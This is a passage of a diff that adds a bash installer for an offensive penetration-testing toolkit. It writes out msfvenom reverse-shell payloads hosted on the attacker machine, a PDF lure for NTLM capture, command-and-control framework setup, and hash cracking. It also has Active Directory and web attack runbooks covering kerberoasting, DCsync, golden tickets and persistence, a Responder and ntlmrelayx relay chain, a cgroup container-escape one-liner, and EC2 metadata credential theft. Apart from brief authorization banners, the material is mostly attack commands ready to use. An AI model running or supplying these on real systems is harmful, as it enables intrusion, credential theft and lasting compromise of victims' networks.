+echo "[*] PDF + Macro + EXE:"; echo "  # 1. Generate EXE payload"; echo "  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o /var/www/html/update.exe"
+echo "  # 2. Embed link in PDF (social engineering) — link to http://$LHOST/update.exe"
+echo ""
+echo "[*] PDF + SMB Capture:"; echo "  # Embed \\\\$LHOST\\share\\file in PDF — triggers NTLM auth on open"
+echo "  # Start responder FIRST: sudo responder -I tun0 -v"
+echo ""
+echo "[*] Listener Setup:"; echo "  use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit -j"
+echo -e "\n⚠️  Social engineering tool — authorized testing ONLY\n"
+EOF
+    log "NEW modules: evasion, kerberos, relay, client_side (4 files)"
+
+
+    # ──────────────────────────────────────────────────────────────────
+    # MODULES: c2/* (3 files — Feature 20: Multi-C2)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/modules/c2/sliver_setup.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Sliver C2 Framework installer & launcher
+echo -e "\n=== SLIVER C2 SETUP ===\n"
+SLIVER_DIR="$HOME/sliver-server"
+install_sliver() {
+    if command -v sliver-server &>/dev/null; then log "Sliver already installed: $(which sliver-server)"; return 0; fi
+    info "Installing Sliver C2..."
+    curl -fsSL https://sliver.sh/install 2>/dev/null | bash 2>/dev/null || {
+        warn "Official installer failed — trying GitHub release..."
+        local rel; rel=$(curl -s https://api.github.com/repos/BishopFox/sliver/releases/latest 2>/dev/null | grep browser_download_url | grep linux_amd64 | head -1 | cut -d'"' -f4)
+        [[ -n "$rel" ]] && { curl -fsSL "$rel" -o /tmp/sliver.tar.gz && tar -xzf /tmp/sliver.tar.gz -C "$SLIVER_DIR" && log "Sliver installed to $SLIVER_DIR"; } || err "Failed"
+    }
+}
+install_sliver
+echo "[*] Start teamserver:"; echo "  cd $SLIVER_DIR && sudo ./sliver-server daemon"
+echo "[*] Connect client:"; echo "  sliver-client import <operator_config>.cfg"
+echo "[*] Generate implant:"; echo "  generate beacon --mtls $LHOST:8888 --os windows --arch amd64 --save /tmp"
+echo "[*] Start listener:"; echo "  mtls --lhost 0.0.0.0 --lport 8888"
+echo -e "\n=== DONE ===\n"
+EOF
+
+    cat > "$D/modules/c2/havoc_setup.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Havoc C2 Framework installer & launcher
+echo -e "\n=== HAVOC C2 SETUP ===\n"
+HAVOC_DIR="$HOME/havoc"
+install_havoc() {
+    if [[ -d "$HAVOC_DIR" ]] && [[ -f "$HAVOC_DIR/havoc" ]]; then log "Havoc already at $HAVOC_DIR"; return 0; fi
+    info "Cloning Havoc C2..."
+    git clone --depth=1 https://github.com/HavocFramework/Havoc.git "$HAVOC_DIR" 2>/dev/null || { err "GitHub clone failed"; return 1; }
+    info "Building Teamserver..."
+    cd "$HAVOC_DIR/teamserver" && go build -o havoc . 2>/dev/null && log "Havoc built" || warn "Build failed — check deps"
+    info "Building Client..."
+    cd "$HAVOC_DIR/client" && make 2>/dev/null || warn "Client build failed — check Qt5 deps"
+    cd - >/dev/null
+}
+install_havoc
+echo "[*] Run teamserver:"; echo "  cd $HAVOC_DIR/teamserver && sudo ./havoc server --profile profiles/havoc.yaotl -v"
+echo "[*] Run client:"; echo "  cd $HAVOC_DIR/client && ./Havoc"
+echo -e "\n=== DONE ===\n"
+EOF
+
+    cat > "$D/modules/c2/mythic_setup.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Mythic C2 Framework installer via Docker
+echo -e "\n=== MYTHIC C2 SETUP ===\n"
+MYTHIC_DIR="$HOME/Mythic"
+install_mythic() {
+    if ! command -v docker &>/dev/null; then err "Docker required — install: sudo apt install docker.io"; return 1; fi
+    if [[ -d "$MYTHIC_DIR" ]]; then log "Mythic already at $MYTHIC_DIR"; return 0; fi
+    info "Cloning Mythic..."
+    git clone --depth=1 https://github.com/its-a-feature/Mythic.git "$MYTHIC_DIR" 2>/dev/null || { err "Clone failed"; return 1; }
+    cd "$MYTHIC_DIR"
+    info "Starting Mythic (this takes several minutes)..."
+    sudo ./mythic-cli install github https://github.com/MythicAgents/apollo 2>/dev/null || true
+    sudo ./mythic-cli start 2>/dev/null && log "Mythic started" || warn "Mythic start failed"
+    cd - >/dev/null
+}
+install_mythic
+echo "[*] Web UI:"; echo "  https://localhost:7443 (default creds: mythic_admin / Mythic-Admin)"
+echo "[*] Start:"; echo "  cd $MYTHIC_DIR && sudo ./mythic-cli start"
+echo "[*] Stop:"; echo "  cd $MYTHIC_DIR && sudo ./mythic-cli stop"
+echo -e "\n=== DONE ===\n"
+EOF
+    log "c2/* (3 files) written"
+
+    # ──────────────────────────────────────────────────────────────────
+    # MODULES: cracking/* (2 files — Feature 22)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/modules/cracking/wordlist_generator.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Wordlist generator — cewl scrape, hashcat rules, custom mutations
+TARGET="${1:-}"; OUT="${2:-custom_wordlist.txt}"
+[[ -z "$TARGET" ]] && { echo "Usage: bash wordlist_generator.sh <URL> [output]"; echo "  bash wordlist_generator.sh https://target.com custom.txt"; exit 1; }
+echo -e "\n=== WORDLIST GENERATOR ===\n"
+echo "[*] cewl (scrape website for keywords):"
+echo "  cewl -d 5 -m 3 -w ${OUT}.cewl $TARGET"
+echo "  # -d 5 = spider depth, -m 3 = minimum word length"
+echo ""
+echo "[*] hashcat rules (expand base wordlist):"
+echo "  hashcat --stdout base_words.txt -r /usr/share/hashcat/rules/best64.rule > ${OUT}.expanded"
+echo "  # Combines each word with best64 mutations (leet speak, case variants, suffix/prefix)"
+echo ""
+echo "[*] Common wordlists (pre-existing):"
+echo "  /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
+echo "  /usr/share/seclists/Passwords/xato-net-10-million-passwords-dup.txt"
+echo "  /usr/share/wordlists/rockyou.txt"
+echo ""
+echo "[*] Custom pattern generation:"
+echo "  # Company name + year + special chars"
+echo "  echo 'CompanyName{2020..2026}{!,@,#}' | bash > ${OUT}.pattern"
+echo ""
+echo "[*] Combine all:"
+echo "  cat ${OUT}.cewl ${OUT}.expanded ${OUT}.pattern | sort -u > $OUT"
+echo "  wc -l $OUT"
+echo -e "\n=== DONE ===\n"
+EOF
+
+    cat > "$D/modules/cracking/auto_crack.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Auto hash cracker — detect hash type, run hashcat or john
+HASH_FILE="${1:-}"; HASH_TYPE="${2:-auto}"
+[[ -z "$HASH_FILE" ]] && { echo "Usage: bash auto_crack.sh <hash_file> [hash_type]"; echo "  bash auto_crack.sh loot/ntlm_hashes.txt ntlm"; exit 1; }
+echo -e "\n=== AUTO CRACKING ENGINE ===\n"
+echo "[*] Input: $HASH_FILE | Type: $HASH_TYPE"
+echo ""
+echo "[*] Hash type detection:"
+echo "  hashid $HASH_FILE"; echo "  # or: hash-identifier \$(head -1 $HASH_FILE)"
+echo ""
+echo "── hashcat ──"
+echo "  # NTLM (mode 1000):"
+echo "  hashcat -m 1000 $HASH_FILE /usr/share/wordlists/rockyou.txt --force -O -o cracked_ntlm.txt"
+echo "  # NetNTLMv2 (mode 5600):"
+echo "  hashcat -m 5600 $HASH_FILE /usr/share/wordlists/rockyou.txt --force -O -o cracked_netntlm.txt"
+echo "  # Kerberos TGS-REP (mode 13100):"
+echo "  hashcat -m 13100 $HASH_FILE /usr/share/wordlists/rockyou.txt --force -O -o cracked_kerberos.txt"
+echo "  # AS-REP (mode 18200):"
+echo "  hashcat -m 18200 $HASH_FILE /usr/share/wordlists/rockyou.txt --force -O -o cracked_asrep.txt"
+echo ""
+echo "── john ──"
+echo "  john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT $HASH_FILE"
+echo "  john --show $HASH_FILE"
+echo ""
+echo "[*] Results:"; echo "  cat cracked_*.txt 2>/dev/null || john --show $HASH_FILE"
+echo -e "\n=== RUN: hashcat -m <MODE> $HASH_FILE /usr/share/wordlists/rockyou.txt --force ===\n"
+EOF
+    log "cracking/* (2 files) written"
+
+    # ──────────────────────────────────────────────────────────────────
+    # RUNBOOKS (3 files)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/runbooks/ad-attack.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Active Directory full attack chain — recon, kerberoast, lateral, DCsync
+DOMAIN="${1:-}"; DC_IP="${2:-}"; ATTACKER_IP="${3:-}"
+[[ -z "$DOMAIN" ]] && { echo "Usage: bash ad-attack.sh <DOMAIN> <DC_IP> <ATTACKER_IP>"; echo "  bash ad-attack.sh corp.local 10.0.0.10 192.168.1.100"; exit 1; }
+echo -e "\n=== AD ATTACK RUNBOOK — $DOMAIN | DC: $DC_IP | Attacker: $ATTACKER_IP ===\n"
+echo "── PHASE 1: Recon ──"
+echo "  enum4linux -a $DC_IP"; echo "  crackmapexec smb $DC_IP/24 --gen-relay-list targets.txt"
+echo "  bloodhound-python -d $DOMAIN -ns $DC_IP -c All"
+echo "  use auxiliary/gather/ldap_hashdump; set RHOSTS $DC_IP; set DOMAIN $DOMAIN; run"
+echo ""
+echo "── PHASE 2: Credential Access ──"
+echo "  impacket-GetNPUsers -dc-ip $DC_IP -request -format hashcat ${DOMAIN}/users.txt"
+echo "  impacket-GetUserSPNs -dc-ip $DC_IP ${DOMAIN}/user:pass -request"
+echo "  crackmapexec smb $DC_IP -u user -p pass --shares"
+echo ""
+echo "── PHASE 3: Lateral Movement ──"
+echo "  use exploit/windows/smb/psexec; set RHOSTS $DC_IP; set SMBUser user; set SMBPass hash; set LHOST $ATTACKER_IP; exploit"
+echo "  crackmapexec smb $DC_IP -u user -H <NTLM_HASH> -x 'whoami'"
+echo ""
+echo "── PHASE 4: Domain Dominance ──"
+echo "  load kiwi; dcsync_ntlm krbtgt; golden_ticket_create -u Administrator -d $DOMAIN"
+echo "  impacket-secretsdump ${DOMAIN}/Administrator@${DC_IP} -just-dc-ntlm"
+echo ""
+echo "── PHASE 5: Persistence ──"
+echo "  use exploit/windows/local/scheduled_task_persistence; set SESSION 1; exploit"
+echo "  run post/windows/manage/enable_rdp"
+echo -e "\n=== RUNBOOK COMPLETE ===\n"
+EOF
+
+    cat > "$D/runbooks/web-attack.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Web application full attack chain — recon, vuln ID, exploit, post-exploit
+TARGET="${1:-}"; ATTACKER_IP="${2:-}"
+[[ -z "$TARGET" ]] && { echo "Usage: bash web-attack.sh <URL> <ATTACKER_IP>"; echo "  bash web-attack.sh http://10.0.0.100:8080 192.168.1.100"; exit 1; }
+echo -e "\n=== WEB ATTACK RUNBOOK — $TARGET | Attacker: $ATTACKER_IP ===\n"
+echo "── PHASE 1: Recon ──"
+echo "  nikto -h $TARGET"; echo "  whatweb $TARGET"; echo "  use auxiliary/scanner/http/http_version; set RHOSTS <HOST>; run"
+echo "  use auxiliary/scanner/http/dir_scanner; set DICTIONARY /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt; run"
+echo ""
+echo "── PHASE 2: Vulnerability ID ──"
+echo "  sqlmap -u '${TARGET}/page.php?id=1' --batch --level=3 --risk=3"
+echo "  nuclei -u $TARGET -t cves/ -severity critical,high"
+echo "  wpscan --url $TARGET --enumerate p,t,u (if WordPress)"
+echo ""
+echo "── PHASE 3: Exploitation ──"
+echo "  use exploit/multi/http/php_cgi_arg_injection; set RHOSTS <HOST>; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST $ATTACKER_IP; exploit"
+echo "  use exploit/multi/http/struts2_content_type_ognl; set RHOSTS <HOST>; set LHOST $ATTACKER_IP; exploit"
+echo ""
+echo "── PHASE 4: Post-Exploit ──"
+echo "  run post/multi/recon/local_exploit_suggester"
+echo "  cat web.config 2>/dev/null; cat .env 2>/dev/null; cat wp-config.php 2>/dev/null"
+echo "  sqlmap -u '${TARGET}' --sql-shell (if SQLi found)"
+echo -e "\n=== RUNBOOK COMPLETE ===\n"
+EOF
+
+    cat > "$D/runbooks/emergency_breakglass.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Emergency break-glass — automated Responder + MITM6 + NTLMRelayx chain
+IFACE="${1:-eth0}"; DOMAIN="${2:-corp.local}"; TARGETS="${3:-targets.txt}"
+echo -e "\n=== EMERGENCY BREAK-GLASS — $IFACE ===\n"
+echo "  This runbook executes the NTLM capture relay chain AUTOMATICALLY."
+echo "  Target: ${DOMAIN:-auto-detect} | Interface: $IFACE"
+echo ""
+echo "  [Step 1] Start Responder (background tmux pane):"
+echo "    tmux new-window -n responder 'sudo responder -I $IFACE -wFbv -A'"
+echo ""
+echo "  [Step 2] Start MITM6 (if IPv6 enabled):"
+echo "    tmux new-window -n mitm6 'sudo mitm6 -d $DOMAIN -i $IFACE'"
+echo ""
+echo "  [Step 3] Start NTLMRelayx (relay captured hashes):"
+echo "    tmux new-window -n relay 'sudo impacket-ntlmrelayx -tf ${TARGETS:-/tmp/targets.txt} -smb2support -of /tmp/loot_hashes.txt'"
+echo ""
+echo "  [Step 4] Wait 5-10 minutes, check loot:"
+echo "    cat /tmp/loot_hashes.txt"
+echo "    # Crack: hashcat -m 5600 /tmp/loot_hashes.txt /usr/share/wordlists/rockyou.txt --force"
+echo ""
+echo "  ⚠️  INTERNAL NETWORK ONLY. Authorized engagements ONLY."
+echo "  ⚠️  This WILL trigger alerts on monitored networks."
+echo ""
+echo "  [Alternative: Single command chain (if tmux not available)]"
+echo "  sudo responder -I $IFACE -A & sudo mitm6 -d $DOMAIN -i $IFACE & sleep 5 && sudo impacket-ntlmrelayx -tf $TARGETS -smb2support"
+echo -e "\n=== RUNBOOK LOADED ===\n"
+EOF
+    log "runbooks/* (3 files) written"
+
+
+    # ──────────────────────────────────────────────────────────────────
+    # LIB FILES: fuzzer, validator, llm_helper, external_api (4 files)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/lib/fuzzer.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: HTTP parameter fuzzer — ffuf, wfuzz, gobuster wrapper
+set -euo pipefail
+
+fuzz_http_param() {
+    local target="${1:-}"; local wordlist="${2:-/usr/share/seclists/Discovery/Web-Content/common.txt}"
+    [[ -z "$target" ]] && { echo "Usage: fuzz_http_param <URL> [wordlist]"; return 1; }
+    echo -e "\n=== HTTP PARAM FUZZ — $target ===\n"
+    echo "[*] ffuf GET param fuzz:"
+    echo "  ffuf -u '${target}?FUZZ=1' -w $wordlist -mc 200,301,302,403 -t 50 -o ffuf_params.json"
+    echo "[*] ffuf POST data fuzz:"
+    echo "  ffuf -u '$target' -X POST -d 'FUZZ=test' -w $wordlist -mc 200,301,302 -t 50"
+    echo "[*] wfuzz:"
+    echo "  wfuzz -c -z file,$wordlist --hc 404 '${target}?FUZZ=test'"
+    echo "[*] gobuster fuzz:"
+    echo "  gobuster fuzz -u '$target' -w $wordlist -t 50"
+    echo -e "\n=== DONE ===\n"
+}
+
+fuzz_http_multipart() {
+    local target="${1:-}"; local wordlist="${2:-/usr/share/seclists/Discovery/Web-Content/common.txt}"
+    [[ -z "$target" ]] && { echo "Usage: fuzz_http_multipart <URL> [wordlist]"; return 1; }
+    echo -e "\n=== MULTIPART FORM FUZZ — $target ===\n"
+    echo "[*] ffuf multipart:"
+    echo "  ffuf -u '$target' -H 'Content-Type: multipart/form-data' -F 'file=@test.txt' -F 'FUZZ=value' -w $wordlist -t 30"
+    echo -e "\n=== DONE ===\n"
+}
+
+fuzz_http_headers() {
+    local target="${1:-}"; local wordlist="${2:-/usr/share/seclists/Discovery/Web-Content/common.txt}"
+    [[ -z "$target" ]] && { echo "Usage: fuzz_http_headers <URL> [wordlist]"; return 1; }
+    echo -e "\n=== HTTP HEADER FUZZ — $target ===\n"
+    echo "[*] ffuf header fuzz (Host, X-Forwarded-For, etc):"
+    echo "  ffuf -u '$target' -H 'FUZZ: test-value' -w $wordlist -mc 200,301,403 -t 50"
+    echo "[*] Custom header wordlist:"
+    echo "  echo -e 'X-Forwarded-For\nX-Real-IP\nX-Custom-IP-Authorization\nX-Originating-IP\nX-Remote-IP\nX-Client-IP' > headers.txt"
+    echo "  ffuf -u '$target' -H 'FUZZ: 127.0.0.1' -w headers.txt -mc 200,403 -t 50"
+    echo -e "\n=== DONE ===\n"
+}
+
+# Auto-run if args provided
+[[ "${1:-}" =~ ^https?:// ]] && fuzz_http_param "$@"
+EOF
+
+    cat > "$D/lib/validator.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Vulnerability validator — confirm MS17-010, BlueKeep, HTTP CVEs with 2+ sources
+set -euo pipefail
+VALIDATED_FILE="${VALIDATED_FILE:-/tmp/validated_findings.json}"
+
+validate_finding() {
+    local cve="$1" target="$2"
+    local status="UNVERIFIED" evidence=""
+    echo -e "\n=== VALIDATE $cve @ $target ===\n"
+    case "$cve" in
+        MS17-010|ms17-010|CVE-2017-0144)
+            echo "[*] Check 1: nmap --script smb-vuln-ms17-010 $target"
+            echo "[*] Check 2: msf auxiliary/scanner/smb/smb_ms17_010"
+            local nmap_out; nmap_out=$(nmap --script smb-vuln-ms17-010 -p 445 "$target" 2>/dev/null || echo "")
+            if echo "$nmap_out" | grep -qi "VULNERABLE"; then
+                status="CONFIRMED"; evidence="nmap SMB vuln scan returned VULNERABLE"
+            else
+                status="FALSE_POSITIVE"; evidence="nmap did not confirm vulnerability"
+            fi
+            ;;
+        BlueKeep|bluekeep|CVE-2019-0708)
+            echo "[*] Check 1: nmap --script rdp-vuln-ms12-020 -p 3389 $target"
+            echo "[*] Check 2: msf auxiliary/scanner/rdp/cve_2019_0708_bluekeep"
+            local rdp_out; rdp_out=$(nmap --script rdp-vuln-ms12-020 -p 3389 "$target" 2>/dev/null || echo "")
+            if echo "$rdp_out" | grep -qi "VULNERABLE"; then
+                status="CONFIRMED"; evidence="nmap RDP vuln scan returned VULNERABLE"
+            else
+                status="FALSE_POSITIVE"; evidence="nmap did not confirm"
+            fi
+            ;;
+        *)
+            echo "[*] Generic CVE check via nuclei:"
+            echo "  nuclei -u $target -id $cve -severity critical,high"
+            local nuc_out; nuc_out=$(nuclei -u "$target" -id "$cve" -silent -jsonl 2>/dev/null || echo "")
+            if [[ -n "$nuc_out" ]]; then
+                status="CONFIRMED"; evidence="$nuc_out"
+            else
+                status="NEEDS_MANUAL"; evidence="nuclei returned no match — manual verification required"
+            fi
+            ;;
+    esac
+    echo "{\"cve\":\"$cve\",\"target\":\"$target\",\"status\":\"$status\",\"evidence\":\"$evidence\",\"timestamp\":\"$(date -Iseconds)\"}" >> "$VALIDATED_FILE"
+    echo "[*] Result: $status"
+}
+
+[[ "${1:-}" =~ ^(MS17|BlueKeep|CVE-) ]] && validate_finding "$1" "${2:-127.0.0.1}"
+EOF
+
+    cat > "$D/lib/llm_helper.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: AI Assistant — Ollama (local) or OpenAI (cloud) for pentest guidance
+set -euo pipefail
+LLM_PROVIDER="${LLM_PROVIDER:-ollama}"
+LLM_MODEL="${LLM_MODEL:-llama3}"
+OPENAI_KEY="${OPENAI_API_KEY:-}"
+OLLAMA_HOST="${OLLAMA_HOST:-localhost:11434}"
+
+ask_ai() {
+    local question="${1:-}"
+    [[ -z "$question" ]] && { echo "Usage: ask_ai '<prompt>'"; echo "  ask_ai 'What exploits work against Apache 2.4.49?'"; return 1; }
+    echo -e "\n=== AI ASSISTANT ($LLM_PROVIDER / $LLM_MODEL) ===\n"
+    echo "[*] Question: $question"
+    echo ""
+
+    case "$LLM_PROVIDER" in
+        ollama)
+            if ! command -v ollama &>/dev/null; then
+                echo "[!] ollama not installed. Install: curl -fsSL https://ollama.ai/install.sh | sh"
+                echo "[*] Falling back to offline reference..."
+                echo "  search Apache 2.4.49 → exploit/multi/http/apache_path_traversal"
+                return 1
+            fi
+            echo "[*] Asking Ollama ($LLM_MODEL)..."; echo "---"
+            curl -s "http://${OLLAMA_HOST}/api/generate" -d "{\"model\":\"$LLM_MODEL\",\"prompt\":\"$question\",\"stream\":false}" 2>/dev/null | jq -r '.response' 2>/dev/null || echo "[!] Ollama query failed"
+            ;;
+        openai)
+            if [[ -z "$OPENAI_KEY" ]]; then
+                echo "[!] OPENAI_API_KEY not set in config.env"; return 1
+            fi
+            echo "[*] Asking OpenAI (gpt-4o-mini)..."; echo "---"
+            curl -s https://api.openai.com/v1/chat/completions \
+              -H "Authorization: Bearer $OPENAI_KEY" \
+              -H "Content-Type: application/json" \
+              -d "{\"model\":\"gpt-4o-mini\",\"messages\":[{\"role\":\"user\",\"content\":\"$question\"}],\"max_tokens\":500}" 2>/dev/null | jq -r '.choices[0].message.content' 2>/dev/null || echo "[!] OpenAI API failed"
+            ;;
+        *)
+            echo "[!] Unknown provider: $LLM_PROVIDER. Use 'ollama' or 'openai'."
+            return 1
+            ;;
+    esac
+    echo "---"; echo -e "\n=== DONE ===\n"
+}
+
+[[ "${1:-}" != "" ]] && ask_ai "$1"
+EOF
+
+    cat > "$D/lib/external_api.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: External API integrations — VirusTotal, Shodan, NVD, Censys
+set -euo pipefail
+VT_API_KEY="${VT_API_KEY:-}"; SHODAN_API_KEY="${SHODAN_API_KEY:-}"
+NVD_API_KEY="${NVD_API_KEY:-}"; CENSYS_UID="${CENSYS_UID:-}"; CENSYS_SECRET="${CENSYS_SECRET:-}"
+
+check_virustotal() {
+    local target="${1:-}"; [[ -z "$VT_API_KEY" ]] && { echo "[!] VT_API_KEY not set"; return 1; }
+    local hash; hash=$(sha256sum "$target" 2>/dev/null | cut -d' ' -f1) || hash="$target"
+    echo "[*] VirusTotal lookup: $hash"
+    local resp; resp=$(curl -s "https://www.virustotal.com/api/v3/files/${hash}" -H "x-apikey: $VT_API_KEY" 2>/dev/null)
+    local malicious; malicious=$(echo "$resp" | jq -r '.data.attributes.last_analysis_stats.malicious // "N/A"' 2>/dev/null)
+    echo "  Malicious detections: $malicious"
+    echo "$resp" | jq '.data.attributes.last_analysis_results | to_entries[] | select(.value.category == "malicious") | "  \(.key): \(.value.result)"' -r 2>/dev/null
+}
+
+check_shodan() {
+    local target="${1:-}"; [[ -z "$SHODAN_API_KEY" ]] && { echo "[!] SHODAN_API_KEY not set"; return 1; }
+    echo "[*] Shodan host lookup: $target"
+    curl -s "https://api.shodan.io/shodan/host/${target}?key=${SHODAN_API_KEY}" 2>/dev/null | jq '{ip:.ip_str,org:.org,os:.os,ports:.ports,hostnames:.hostnames,vulns:.vulns}' 2>/dev/null || echo "[!] No results or API error"
+}
+
+check_nvd() {
+    local cve="${1:-CVE-2021-44228}"; cve="${cve^^}"
+    echo "[*] NVD lookup: $cve"
+    curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${cve}" 2>/dev/null | jq '{id:.vulnerabilities[0].cve.id,desc:.vulnerabilities[0].cve.descriptions[0].value,cvss:.vulnerabilities[0].cve.metrics.cvssMetricV31[0].cvssData.baseScore,severity:.vulnerabilities[0].cve.metrics.cvssMetricV31[0].cvssData.baseSeverity}' 2>/dev/null || echo "[!] NVD lookup failed"
+}
+
+check_censys() {
+    local target="${1:-}"; [[ -z "$CENSYS_UID" ]] && { echo "[!] CENSYS_UID/CENSYS_SECRET not set"; return 1; }
+    echo "[*] Censys host lookup: $target"
+    curl -s "https://search.censys.io/api/v2/hosts/${target}" -u "${CENSYS_UID}:${CENSYS_SECRET}" 2>/dev/null | jq '{ip:.result.ip,services:.result.services[]?.service_name,ports:.result.services[]?.port}' 2>/dev/null || echo "[!] Censys lookup failed"
+}
+
+# Auto-run based on first argument
+case "${1:-}" in
+    vt|virustotal) check_virustotal "${2:-}" ;;
+    shodan)       check_shodan "${2:-}" ;;
+    nvd|cve)       check_nvd "${2:-}" ;;
+    censys)       check_censys "${2:-}" ;;
+esac
+EOF
+    log "lib/* (4 NEW files): fuzzer, validator, llm_helper, external_api written"
+
+
+    # ──────────────────────────────────────────────────────────────────
+    # MODULES: cloud/aws_enum.sh + container/docker_escape.sh (2 files)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/modules/cloud/aws_enum.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: AWS cloud enumeration — S3 buckets, IAM roles, EC2 metadata, Lambda
+set -euo pipefail
+TARGET="${1:-}"; PROFILE="${AWS_PROFILE:-default}"
+echo -e "\n=== AWS CLOUD ENUMERATION ===\n"
+echo "[*] Profile: $PROFILE"
+echo ""
+echo "[*] S3 Bucket enumeration:"
+echo "  aws s3 ls --profile $PROFILE"
+echo "  aws s3api list-buckets --query 'Buckets[].Name' --profile $PROFILE"
+echo "  # Check bucket permissions:"
+echo "  aws s3api get-bucket-acl --bucket <BUCKET> --profile $PROFILE"
+echo "  # Public buckets:"
+echo "  curl -s http://<BUCKET>.s3.amazonaws.com"
+echo ""
+echo "[*] IAM enumeration:"
+echo "  aws iam list-users --profile $PROFILE"
+echo "  aws iam list-roles --profile $PROFILE"
+echo "  aws iam list-policies --scope Local --profile $PROFILE"
+echo "  aws iam get-account-authorization-details --profile $PROFILE"
+echo ""
+echo "[*] EC2 enumeration:"
+echo "  aws ec2 describe-instances --region us-east-1 --profile $PROFILE"
+echo "  aws ec2 describe-security-groups --profile $PROFILE"
+echo "  # Metadata endpoint (from compromised EC2):"
+echo "  curl http://169.254.169.254/latest/meta-data/"
+echo "  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+echo ""
+echo "[*] Lambda enumeration:"
+echo "  aws lambda list-functions --profile $PROFILE"
+echo "  aws lambda get-function --function-name <NAME> --profile $PROFILE"
+echo ""
+echo "[*] Route53 / DNS:"
+echo "  aws route53 list-hosted-zones --profile $PROFILE"
+echo "  aws route53 list-resource-record-sets --hosted-zone-id <ID> --profile $PROFILE"
+echo ""
+echo "[*] IAM privilege escalation check:"
+echo "  # Check if current user can escalate:"
+echo "  aws iam list-attached-user-policies --user-name <USER> --profile $PROFILE"
+echo "  aws iam simulate-principal-policy --policy-source-arn <ARN> --action-names iam:CreateUser,iam:AttachUserPolicy"
+echo -e "\n=== DONE ===\n"
+EOF
+
+    cat > "$D/modules/container/docker_escape.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Container escape techniques — privileged container, sock mount, cgroups
+set -euo pipefail
+echo -e "\n=== CONTAINER ESCAPE TECHNIQUES ===\n"
+echo "[*] 1. Check if running in container:"
+echo "  cat /proc/1/cgroup | grep docker"
+echo "  ls /.dockerenv 2>/dev/null && echo 'Container detected'"
+echo ""
+echo "[*] 2. Privileged container escape (--privileged flag):"
+echo "  # Mount host disk:"
+echo "  fdisk -l"
+echo "  mount /dev/sda1 /mnt && chroot /mnt"
+echo "  # Or via cgroups notify_on_release:"
+echo "  d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`"
+echo "  mkdir -p $d/w; echo 1 >$d/w/notify_on_release"
+echo "  t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`"
+echo "  touch /o; echo $t/c | tee $d/release_agent"
+echo "  echo '#!/bin/sh' >/c; echo 'chroot /mnt /bin/sh' >>/c; chmod +x /c"
+echo "  sh -c 'echo 0 >$d/w/cgroup.procs'; sleep 1; cat /o"
+echo ""
+echo "[*] 3. Docker socket escape (/var/run/docker.sock mounted):"
+echo "  # If docker socket is accessible:"
+echo "  docker -H unix:///var/run/docker.sock run -it --privileged -v /:/host ubuntu chroot /host"
+echo "  # Or via docker-compose if available:"
+echo "  echo 'version:3; services:escape(image:ubuntu,privileged:true,command:chroot /host,volumes:[\"/:/host\"])' | docker-compose -f - up"
+echo ""
+echo "[*] 4. CVE-2022-0492 (cgroup v1 release_agent):"
+echo "  # Exploits cgroup v1 release_agent when CAP_SYS_ADMIN is available"
+echo "  # Check capabilities:"
+echo "  capsh --print 2>/dev/null || grep Cap /proc/1/status"
+echo ""
+echo "[*] 5. Kubernetes escape:"
+echo "  # Service account token:"
+echo "  cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+echo "  # Kubelet API (port 10250):"
+echo "  curl -k https://<NODE_IP>:10250/runningpods/"
+echo ""
+echo "[*] 6. Escape detection (check for weak isolation):"
+echo "  cat /proc/1/cgroup | grep -v 'docker\|kubepods\|containerd'"
+echo "  ip link; ip addr; route -n; arp -a"
+echo "  # Sensitive mounts:"
+echo "  mount | grep -E '/proc|/sys|/dev|/var/run/docker.sock'"
+echo -e "\n=== DONE ===\n"
+EOF
+    log "modules/cloud + modules/container (2 files) written"
+
+
+    # ──────────────────────────────────────────────────────────────────
+    # DASHBOARD: Flask + Socket.IO web dashboard (3 files)
+    # ──────────────────────────────────────────────────────────────────
+    mkdir -p "$D/dashboard/templates" "$D/dashboard/static"
+
+    cat > "$D/dashboard/app.py" << 'PYEOF'
+#!/usr/bin/env python3
+"""Metasploit Dashboard — Live session tracker, loot viewer, AI chat"""
+import os, json, time, threading, subprocess
+from datetime import datetime
+from flask import Flask, render_template, request, jsonify
+from flask_socketio import SocketIO, emit
+
+app = Flask(__name__)
+app.config['SECRET_KEY'] = os.environ.get('DASHBOARD_SECRET', os.urandom(24).hex())
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
+
+STATS = {
+    'sessions': 0, 'hosts': 0, 'services': 0, 'vulns': 0, 'loot': 0,
+    'uptime': '', 'started': datetime.now().isoformat(), 'events': [],
+    'tools': {'nmap': False, 'msfconsole': False, 'hashcat': False, 'john': False}
+}
+
+def bg_stats_updater():
+    """Update tool availability every 30s"""
+    while True:
+        for tool in STATS['tools']:
+            STATS['tools'][tool] = subprocess.run(['command','-v',tool], capture_output=True).returncode == 0
